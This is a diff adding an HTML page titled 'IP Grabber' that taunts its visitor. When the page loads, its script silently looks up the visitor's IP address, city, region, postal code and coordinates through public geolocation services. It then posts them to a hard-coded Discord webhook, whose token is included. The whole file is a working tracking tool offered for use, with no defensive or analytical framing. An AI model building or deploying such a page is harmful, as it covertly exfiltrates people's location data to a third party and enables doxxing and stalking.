@@ -1,0 +1,73 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>IP Grabber</title>  
+    <style>  
+        body {  
+            font-family: Arial, sans-serif;  
+            text-align: center;  
+            margin-top: 50px;  
+            padding: 20px;  
+        }  
+        h1 {  
+            color: red;  
+            font-size: 2rem;  
+        }  
+        @media (max-width: 600px) {  
+            h1 {  
+                font-size: 1.5rem;  
+            }  
+        }  
+    </style>  
+</head>  
+<body>  
+    <h1>You idiot, you fell XD for it!</h1>  
+    <script>  
+        // Function to fetch the user's IP address  
+        async function getIP() {  
+            const response = await fetch('https://api.ipify.org?format=json');  
+            const data = await response.json();  
+            return data.ip;  
+        }  
+
+        // Function to get location details based on IP  
+        async function getLocation(ip) {  
+            const response = await fetch(`https://ipapi.co/${ip}/json/`);  
+            const data = await response.json();  
+            return {  
+                city: data.city,  
+                region: data.region,  
+                country: data.country_name,  
+                postal: data.postal,  
+                latitude: data.latitude,  
+                longitude: data.longitude  
+            };  
+        }  
+
+        // Function to send the IP and location to Discord  
+        async function sendToDiscord(ip, location) {  
+            const webhookURL = 'https://discord.com/api/webhooks/1335747760938287226/u5jzn2B2uVDP1VcTqy4MVRGv2cdM1EAtwN9SMynhtGmIfnwZ410vY7THaT0Qcx6NGQ4y';  
+            const message = {  
+                content: `New IP grabbed: ${ip}\nLocation: ${location.city}, ${location.region}, ${location.country}\nPostal: ${location.postal}\nCoordinates: ${location.latitude}, ${location.longitude}`  
+            };  
+
+            await fetch(webhookURL, {  
+                method: 'POST',  
+                headers: {  
+                    'Content-Type': 'application/json'  
+                },  
+                body: JSON.stringify(message)  
+            });  
+        }  
+
+        // Main function  
+        (async () => {  
+            const ip = await getIP();  
+            const location = await getLocation(ip);  
+            await sendToDiscord(ip, location);  
+        })();  
+    </script>  
+</body>  
+</html>  
